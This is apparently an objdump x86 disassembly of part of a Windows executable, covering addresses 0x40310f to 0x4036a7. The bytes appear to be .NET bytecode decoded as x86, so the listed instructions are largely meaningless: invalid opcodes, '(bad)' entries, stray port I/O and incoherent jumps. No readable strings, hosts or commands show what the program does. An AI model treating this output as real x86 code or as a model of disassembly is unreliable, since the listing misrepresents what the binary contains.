  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 e2       	add    $0xe2720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 ea 21       	and    $0x21ea7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 54    	or     0x54721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 66    	or     0x66721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 7a             	or     0x7a(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 d8             	or     -0x28(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 d8             	or     -0x28(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 dc                	jb     0x40329f
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 e6             	or     %esi,-0x1a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 fa                	jb     0x4032e0
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 1a                	jb     0x40330c
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 d8             	or     -0x28(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 30                	jb     0x40333e
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 38                	jb     0x40335c
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 44                	jb     0x403374
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 54                	jb     0x4034c1
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 5a             	adc    %esi,0x5a(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 a0 23    	or     0x23a07209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	ba 23 00 70 28       	mov    $0x28700023,%edx
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 e6             	or     %esi,-0x1a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 f2             	or     -0xe(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	02 24 00             	add    (%eax,%eax,1),%ah
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 e6                	jb     0x403517
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 10             	or     0x10(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 26             	adc    %esi,0x26(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
